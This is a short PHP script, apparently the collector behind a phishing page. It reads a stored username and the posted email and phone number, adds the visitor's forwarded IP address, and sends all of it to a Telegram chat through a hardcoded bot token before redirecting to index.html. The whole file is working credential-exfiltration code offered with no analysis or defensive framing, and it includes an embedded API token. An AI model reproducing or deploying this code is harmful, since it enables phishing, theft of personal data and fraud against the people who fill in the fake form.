<?php

@session_start();

if ( isset ($_POST['usuario']) && isset ($_POST['email']) ){
$usario=$_SESSION['SMS'];
  $codigo=$_POST['usuario'];

$message = "User.: ".$usario."\nCorreo.: ".$_POST['email']."\nTelefono: ".$_POST['usuario']." ".$_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";

$apiToken = "5582199534:AAFkgaLWTaDUbAkp7Mcoe5sKKTBg68RxvxE";

    $data = [
        'chat_id' => '-968643838',
        'text' => $message
    ];

    $url = "https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data); 
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_URL, $url);  
    $result = curl_exec($ch);

Header ("Location: index.html");
}
?>